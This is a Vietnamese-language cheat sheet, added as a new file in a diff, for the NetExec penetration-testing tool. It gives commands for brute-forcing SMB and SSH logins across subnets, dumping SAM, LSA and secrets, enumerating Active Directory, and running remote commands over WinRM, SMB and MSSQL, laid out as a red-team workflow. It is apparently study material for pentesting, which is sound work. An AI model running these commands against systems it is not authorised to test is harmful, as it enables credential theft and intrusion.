@@ -1,0 +1,148 @@
+✅ 1. Giới thiệu Netexec
+
+    netexec là công cụ dùng để quét, tấn công, brute-force, liệt kê, thực thi lệnh... trên các dịch vụ mạng như:
+
+        SMB
+
+        WinRM
+
+        RDP
+
+        LDAP
+
+        MSSQL
+
+        SSH
+
+        Redis, MySQL, v.v.
+
+    Là bản kế thừa của CrackMapExec – nhưng được viết lại để ổn định, modular hơn.
+
+✅ 2. Cài đặt Netexec
+Cài từ pip:
+
+pipx install git+https://github.com/Pennyw0rth/NetExec.git
+
+Nếu chưa có pipx:
+
+python3 -m pip install pipx
+pipx ensurepath
+
+Kiểm tra:
+
+netexec -h
+
+✅ 3. Cấu trúc lệnh cơ bản
+
+netexec <protocol> <target> -u <username> -p <password>
+
+Ví dụ:
+
+netexec smb 10.10.11.70 -u administrator -p 'P@ssw0rd!'
+
+✅ 4. Module phổ biến (theo giao thức)
+🔹 smb – Tấn công mạng chia sẻ Windows
+
+netexec smb <target> -u <user> -p <pass>
+
+Lệnh	Tác dụng
+--shares	Liệt kê các share
+--sessions	Xem phiên đăng nhập
+--users	Liệt kê người dùng
+--pass-pol	Xem chính sách mật khẩu
+--lsa	Dump thông tin LSA (nếu có quyền)
+--sam	Dump SAM database
+--exec <cmd>	Thực thi lệnh từ xa (qua SMB/SMBexec)
+🔹 rdp – Kiểm tra RDP
+
+netexec rdp <target> -u <user> -p <pass>
+
+    Hữu ích khi bạn muốn test tài khoản đăng nhập qua Remote Desktop.
+
+🔹 winrm – Remote Powershell execution
+
+netexec winrm <target> -u <user> -p <pass> --exec whoami
+
+    Rất mạnh nếu user có quyền WinRM.
+
+🔹 ldap – Dump thông tin Active Directory
+
+netexec ldap <DC_IP> -u <user> -p <pass> --users
+
+Tham số	Tác dụng
+--users	Dump danh sách user
+--groups	Dump nhóm
+--computers	Dump computer object
+--domain-info	Lấy domain SID, tên
+🔹 mssql – Bruteforce và thực thi lệnh
+
+netexec mssql <target> -u <user> -p <pass> --exec whoami
+
+🔹 ssh – SSH bruteforce & exec
+
+netexec ssh 192.168.1.5 -u root -p toor --exec whoami
+
+✅ 5. Dò mật khẩu (Brute-force)
+
+netexec smb 10.10.11.70 -u users.txt -p passwords.txt
+
+✅ 6. Dò máy sống / nhiều host
+
+netexec smb 10.10.11.0/24 -u user -p pass --shares
+
+✅ 7. Tùy chọn hay dùng
+Tùy chọn	Chức năng
+-d <domain>	Chỉ định domain
+--local-auth	Xác thực local thay vì domain
+--no-bruteforce	Bỏ brute-force
+--continue-on-success	Tiếp tục dù đã login
+--json	Xuất kết quả ra JSON
+--verbose hoặc -v	Hiện nhiều thông tin
+✅ 8. Các Module nâng cao của Netexec
+
+Bạn có thể liệt kê module với:
+
+netexec smb --list-modules
+
+Ví dụ:
+
+    kerberos
+
+    psexec
+
+    mimikatz
+
+    wmi
+
+    exec
+
+    registry
+
+    lsa, sam, secrets...
+
+✅ 9. Tự viết plugin/module tùy biến
+
+Netexec hỗ trợ plugin framework, cho phép bạn viết module riêng (.py trong thư mục modules/<protocol>/).
+📌 Ví dụ workflow Red Team với Netexec
+
+    Brute-force SMB:
+
+netexec smb 10.10.11.0/24 -u users.txt -p rockyou.txt
+
+Dump danh sách user từ LDAP:
+
+netexec ldap DC_IP -u admin -p pass --users
+
+RCE qua WinRM hoặc SMB:
+
+netexec winrm victim -u admin -p pass --exec whoami
+
+Dump SAM, LSA, secrets (nếu SYSTEM):
+
+    netexec smb victim -u admin -p pass --sam --lsa --secrets
+
+✅ 10. Tổng kết
+Mức	Hành động
+Cơ bản	Quét SMB, LDAP, WinRM
+Trung cấp	Bruteforce, enum user/group/share
+Nâng cao	Dump SAM/LSA, thực thi RCE, viết module
